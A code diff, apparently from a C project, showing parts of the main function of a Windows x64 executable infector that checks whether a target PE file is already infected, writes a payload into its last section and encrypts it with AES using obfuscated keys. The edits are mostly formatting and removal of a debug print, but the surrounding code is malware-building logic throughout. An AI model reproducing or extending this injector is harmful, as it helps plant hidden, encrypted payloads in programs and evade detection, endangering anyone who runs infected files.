@@ -89,8 +89,6 @@ int main(CONST int argc, CONST LPCSTR argv[]) {
 #endif  // NO_ENCRYPT
 
     DWORD dwPayloadSize = (DWORD)((PCBYTE)&__payload_end - (PCBYTE)&__payload_start);
-    printf("Payload size: %lu\n", dwPayloadSize);
-    // HexDump((PCBYTE)&__payload_start, dwPayloadSize);
 
     LPCSTR sTarget;
     BOOL bVerbose = FALSE;
@@ -160,7 +158,8 @@ int main(CONST int argc, CONST LPCSTR argv[]) {
     pNtHeaderRO = (PCIMAGE_NT_HEADERS64)((PBYTE)pDosHeaderRO + pDosHeaderRO->e_lfanew);
     if (pNtHeaderRO->Signature != IMAGE_NT_SIGNATURE ||
         pNtHeaderRO->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
-        pNtHeaderRO->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        pNtHeaderRO->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+    {
         printf("[!] Not a PE x64 file\n");
         ret = 1;
         goto unmap;
@@ -193,7 +192,8 @@ int main(CONST int argc, CONST LPCSTR argv[]) {
     // Check if the payload is already injected by looking for the signature
     // right before the entry point, if it's inside the last section
     if (dwOrigEntryPoint >= dwLastSectionRva &&
-        dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
+        dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize)
+    {
         dwSignature = *(PCDWORD)((PCBYTE)pDosHeaderRO + dwLastSectionPtr +
                                  (dwOrigEntryPoint - dwLastSectionRva) -
                                  ((PCBYTE)&payload - (PCBYTE)&signature));
@@ -313,7 +313,7 @@ int main(CONST int argc, CONST LPCSTR argv[]) {
     // Payload is ready to be injected
     printf("New payload:\n");
     if (bVerbose) {
-    HexDump(&__payload_start, dwPayloadSize);
+        HexDump(&__payload_start, dwPayloadSize);
     }
 
     pPayloadDest = (PBYTE)pDosHeaderRW + dwPayloadPtr;
@@ -326,10 +326,10 @@ int main(CONST int argc, CONST LPCSTR argv[]) {
     printf("[*] Encrypting payload...\n");
 
     if (bVerbose) {
-    printf("[*] Using AES key:\n");
-    HexDump((PCBYTE)DEOBF_BYTES(aesKey), DEOBF(aesKey).size);
-    printf("[*] Using AES IV:\n");
-    HexDump((PCBYTE)DEOBF_BYTES(aesIv), DEOBF(aesIv).size);
+        printf("[*] Using AES key:\n");
+        HexDump((PCBYTE)DEOBF_BYTES(aesKey), DEOBF(aesKey).size);
+        printf("[*] Using AES IV:\n");
+        HexDump((PCBYTE)DEOBF_BYTES(aesIv), DEOBF(aesIv).size);
     }
 
     sszPayloadEncOffset = &__payload_enc_start - &__payload_start;
@@ -341,7 +341,8 @@ int main(CONST int argc, CONST LPCSTR argv[]) {
     }
 
     if (EncryptPayload(pPayloadDest + sszPayloadEncOffset, sszPayloadEncSize,
-                       (PCAES_KEY)DEOBF_BYTES(aesKey), (PCAES_IV)DEOBF_BYTES(aesIv))) {
+                       (PCAES_KEY)DEOBF_BYTES(aesKey), (PCAES_IV)DEOBF_BYTES(aesIv)))
+    {
         ret = 1;
         goto unmap;
     }
